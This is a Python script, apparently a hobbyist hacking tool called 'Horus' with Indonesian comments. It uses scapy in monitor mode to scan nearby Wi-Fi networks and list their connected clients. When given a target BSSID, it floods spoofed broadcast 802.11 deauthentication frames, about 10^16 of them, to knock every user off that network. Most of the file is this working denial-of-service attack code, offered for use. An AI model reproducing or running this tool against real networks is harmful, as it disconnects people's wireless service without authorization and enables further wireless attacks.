#!/usr/bin/env python3

import os
import platform
import subprocess
import sys
import time

import asyncio
import keyboard
from distro import distro
from scapy.all import *
from scapy.all import I
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap, Dot11Deauth
from tabulate import tabulate

# Horus v0 - The Chosen One
#
# syarat penggunaan script ini:
# - semua jenis linux (Arch, Debian, Fedora/Red Hat)
# - Wi-Fi adapter *support monitor mode
# - superuser privilege
# - windows gabisa, karna gbisa setting wifi adapter ke monitor mode walaupun
#   wifi adapter tsb support monitor mode
#
# Kelemahan tools
# - Hanya bisa dipake klo Wi-Fi target ada clientnya
# - only support 2.4Ghz frequency 5G Wi-Fi kemungkinan blum bisa (blum bisa, bukan nggk bisa 🥱)
# -

table = []


class Sniffer:
    __tempbssid = []
    __tmpusr = []
    __netlist = []

    def Hiraisyn(self, iface, pre):  # MAIN FUNCTION
        while True:
            try:
                for ch in list(range(1, 15)):
                    os.system(f"iwconfig {iface} channel {ch}")
                    self.__performHiraisyn(iface, pre)
                    pre.showTable()
                    time.sleep(2)
            except KeyboardInterrupt:
                print("exiting by user")
                break

    def __performHiraisyn(self, i, pre):
        sniff(
            iface=i,
            prn=lambda frame: self.__netSniffer(frame, pre),
            store=False,
            count=0,
            monitor=True,
            timeout=1
        )

    def __netSniffer(self, frame, pre):

        # sumber https://en.wikipedia.org/wiki/802.11_Frame_Types
        # scroll ke bwah dikit ada tabel types and subtypes

        # Association Response frame, type 0 subtype 1
        # knapa Association Response frame?
        # krna frame ini yg menandakan berhasil atau tidaknya user konek ke wipi
        # jika brhasil frame.status == 0 jika tidak == 1
        if frame.haslayer(Dot11) and frame.type == 0 and frame.subtype == 1:
            user = frame.addr1  # station
            ap_bssid = frame.addr2  # bssid
            # status = frame.status

            if user and user not in self.__tmpusr:
                self.__tmpusr.append(user)
                pre.assoRespHandler([user], ap_bssid)

        #
        elif frame.haslayer(Dot11Beacon):
            ssid = frame.info.decode()
            bssid = frame.addr3
            ch = ord(frame[Dot11Elt:3].info)

            if bssid not in self.__tempbssid:
                self.__tempbssid.append(bssid)
                pre.beaconFrameHandler(ch, ssid, bssid)


class Presentation:
    __state = False
    __tmpState = []

    def assoRespHandler(self, users, bssid):
        tempAR = [
            None,
            None,
            bssid,
            users
        ]
        if users and bssid:
            if table:
                for _, net in enumerate(table):
                    if net[2] == bssid:
                        net[3].extend(users if isinstance(users, list) else [users])
            else:
                table.append(tempAR)

    def beaconFrameHandler(self, ch, ssid, bssid):

        if ch and ssid and bssid:
            tempBF = [
                ch,
                ssid,
                bssid,
                []
            ]
            if table:
                for _, net in enumerate(table):
                    if net[2] != bssid:
                        table.append(tempBF)
                    else:
                        net[0] = ch
                        net[1] = ssid
            else:
                if bssid not in self.__tmpState:
                    table.append(tempBF)
                    self.__tmpState.append(bssid)

    def showTable(self):
        os.system("clear")
        self.__show()

    def __show(self):
        if table:
            simpler = [
                [
                    info[0] if info[0] else "NaN",
                    info[1] if info[1] else "NaN",
                    info[2] if info[2] else "NaN",
                    "gada yang konek" if not info[3] else '\n'.join(info[3])
                ] for info in table
            ]
            print(tabulate(simpler, headers=["CHANNEL", "SSID", "BSSID", "USERS"], tablefmt="presto"))
            print("ctrl c to exit....")
        else:
            print("Scanning.....")


def systemCheck():
    if sys.platform == "win32":
        print("pfft, hacker kok pake windows bang?")
        return False
    elif sys.platform == "linux":
        print(f"Linux detected: {distro.id()}\n"
              f"Version: {distro.version()}\n"
              f"Base: {distro.like()}\n"
              f"Codename: {distro.codename()}\n")
        time.sleep(3)
        if os.geteuid() == 0:
            return True
        else:
            print("run with superuser!!")
            sys.exit()
    else:
        print("os not supported :( ")
        return False


event = asyncio.Event()


async def chHiraisyn(iface):
    while not event.is_set():
        for ch in list(range(1, 15)):
            os.system(f"iwconfig {iface} channel {ch}")
            await asyncio.sleep(2)


async def startHiraisn(iface):
    return asyncio.create_task(chHiraisyn(iface))


def craftDeauthFrame(bssid, iface):
    allframe = Dot11(
        addr1="ff:ff:ff:ff:ff:ff",  # dst address
        addr2=bssid,  # source address
        addr3=bssid,  # bssid
    )
    payload = RadioTap() / allframe / Dot11Deauth(reason=1)
    sendp(payload, iface, count=1, monitor=True, verbose=1)


def deauthAtt(bssid, iface, ch):
    allframe = Dot11(
        addr1="ff:ff:ff:ff:ff:ff",  # dst address
        addr2=bssid,  # source address
        addr3=bssid,  # bssid
    )
    payload = RadioTap() / allframe / Dot11Deauth()

    if bssid and iface and ch:
        os.system(f"iwconfig {iface} channel {ch}")
        sendp(payload, iface, count=10000000000000000, monitor=True, verbose=1)
    else:
        print("not valid argument")

# async def performDeauth(iface):
#
#
#
#     if table:
#         for _, net in enumerate(table):
#             while not net[3]:
#                 await asyncio.sleep(2)
#                 craftDeauthFrame(net[2], iface)
#
#             event.set()
#             await hiraisynTask

# if table:
#     loop = asyncio.get_event_loop()
#     for _, target in enumerate(table):
#         if not target[3]:
#
#             try:
#                 asyncio.ensure_future(chHiraisyn(iface))
#                 craftDeauthFrame(bssid, iface)
#                 loop.run_forever()
#             finally:
#                 loop.close()
#         else:
#             loop.stop()


if __name__ == "__main__":


    pre = Presentation()
    sniffer = Sniffer()

    if systemCheck():
        if len(sys.argv) == 4:
            i = sys.argv[1]
            bssid = sys.argv[2]
            ch = sys.argv[3]
            print("perform deauth!!")
            time.sleep(1)
            deauthAtt(bssid, i, ch)
        else:
            print("argument not specified, Scanning!!")

            iface = input("specify the interface: ")
            os.system(f"airmon-ng start {iface}")

            time.sleep(2)
            sniffer.Hiraisyn(iface, pre)
            # state = False
            # while not state:
            #
            #     if keyboard.is_pressed("q"):
            #         print("exiting by user")
            #         state = True
            #         sys.exit()
    else:
        print("Bye :-)")
